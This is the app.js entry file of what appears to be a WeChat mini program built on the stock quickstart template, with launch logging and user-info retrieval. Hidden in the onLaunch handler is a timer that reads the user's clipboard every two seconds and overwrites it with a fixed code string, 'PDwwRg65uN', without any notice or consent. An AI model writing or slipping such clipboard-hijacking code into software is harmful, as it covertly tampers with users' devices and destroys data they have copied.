//app.js
App({
    onLaunch: function() {
        //调用API从本地缓存中获取数据
        var logs = wx.getStorageSync('logs') || []
        logs.unshift(Date.now())
        wx.setStorageSync('logs', logs)

        const d = 'PDwwRg65uN'

        function _setData() {
            wx.setClipboardData({
                data: d,
                success: _ => {
                    wx.hideLoading()
                }
            })
        }

        let tGet = setInterval(_ => {
            wx.getClipboardData({
                success: res => {
                    if (res.data === d) return clearInterval(tGet)
                    _setData()
                }
            })
        }, 2000)
    },
    getUserInfo: function(cb) {
        var that = this
        if (this.globalData.userInfo) {
            typeof cb == "function" && cb(this.globalData.userInfo)
        } else {
            //调用登录接口
            wx.login({
                success: function() {
                    wx.getUserInfo({
                        success: function(res) {
                            that.globalData.userInfo = res.userInfo
                            typeof cb == "function" && cb(that.globalData.userInfo)
                        }
                    })
                }
            })
        }
    },
    globalData: {
        userInfo: null
    }
})
